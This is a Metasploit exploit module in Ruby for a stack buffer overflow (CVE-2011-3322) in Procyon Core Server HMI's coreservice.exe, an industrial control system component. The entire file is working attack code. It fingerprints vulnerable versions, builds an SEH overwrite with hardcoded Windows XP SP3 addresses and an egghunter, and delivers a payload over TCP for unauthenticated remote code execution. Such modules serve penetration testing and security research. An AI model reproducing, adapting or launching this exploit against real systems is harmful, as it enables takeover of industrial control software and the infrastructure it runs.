##
# $Id: procyon_core_server.rb 13724 2011-09-12 21:42:36Z swtornio $
##
 
##
# This file is part of the Metasploit Framework and may be subject to
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##
 
require 'msf/core'
 
class Metasploit3 < Msf::Exploit::Remote
    Rank = NormalRanking
 
    include Msf::Exploit::Remote::Egghunter
    include Msf::Exploit::Remote::Tcp
 
    def initialize(info={})
        super(update_info(info,
            'Name'           => "Procyon Core Server HMI <= v1.13 Coreservice.exe Stack Buffer Overflow",
            'Description'    => %q{
                    This module exploits a vulnerability in the coreservice.exe component of Proycon
                Core Server <= v1.13. While processing a password, the application
                fails to do proper bounds checking before copying data into a small buffer on the stack.
                This causes a buffer overflow and allows to overwrite a structured exception handling
                record on the stack, allowing for unauthenticated remote code execution.  Also, after the
                payload exits, Coreservice.exe should automatically recover.
            },
            'License'        => MSF_LICENSE,
            'Version'        => '$Revision: 13724 $',
            'Author'         =>
                [
                    'Knud Hørd <keh[at]nsense.dk>',        # Initial discovery
                    'mr_me <steventhomasseeley[at]gmail.com>', # Initial discovery & poc/msf
                ],
            'References'     =>
                [
                    ['CVE', 'CVE-2011-3322'],
                    ['OSVDB', '75371'],
                    ['URL', 'http://www.uscert.gov/control_systems/pdf/ICSA-11-216-01.pdf'],
                    ['URL', 'http://www.stratsec.net/Research/Advisories/Procyon-Core-Server-HMI-Remote-Stack-Overflow']
                ],
            'Payload'        =>
                {
                    'BadChars' => "\x00\x0a\x0d",
                },
            'DefaultOptions'  =>
                {
                    'ExitFunction' => 'process',
                },
            'Platform'       => 'win',
            'Targets'        =>
                [
 
                    [
                        'Windows XP SP3 - No dep bypass',
                        {
                            'Ret'    => 0x774699bf, # JMP ESP [user32.dll]
                            'Edx'    => 0x1D847770, # 0x7712dec2 -> 0x00700040 RW [oleaut32.dll]
                            'Eax'    => 0x01010106, # 0x7712dec2 -> 0x00700040 RW [oleaut32.dll]
                            'Offset' => 8
                        }
                    ],
                ],
            'Privileged'     => true,
            'DisclosureDate' => "Sep 08 2011",
            'DefaultTarget'  => 0))
 
            register_options(
            [
                Opt::RPORT(23)
            ], self.class)
    end
 
    def check
        connect
        res = sock.get_once.chomp  #This gives us string "----------------------------"
        res = sock.get_once.chomp  #This gives us the actual software version
        disconnect
 
        if res =~ /Core Command Interface V1\.(.*)2/
            return Exploit::CheckCode::Vulnerable
        end
        return Exploit::CheckCode::Safe
    end
 
    def exploit
 
        eggoptions =
        {
            :checksum => false,
            :eggtag => 'ssec',
        }
 
        badchars = "\x00\x0a\x0d"
        hunter,egg = generate_egghunter(payload.encoded, badchars, eggoptions)
 
        sploit = rand_text_alpha_upper(45)
        sploit << [target['Edx']].pack('V')
        sploit << [0x41414141].pack('V')
        sploit << [target['Eax']].pack('V')
        sploit << rand_text_alpha_upper(target['Offset'])
        sploit << [target.ret].pack('V')
        sploit << make_nops(10)
        sploit << hunter
        sploit << rand_text_alpha_upper(500)
        sploit << egg
        sploit << "\r\n"
 
        connect
        sock.get_once()
        print_status("Sending request...")
        sock.put(sploit)
        handler()
        disconnect
 
    end
 
end
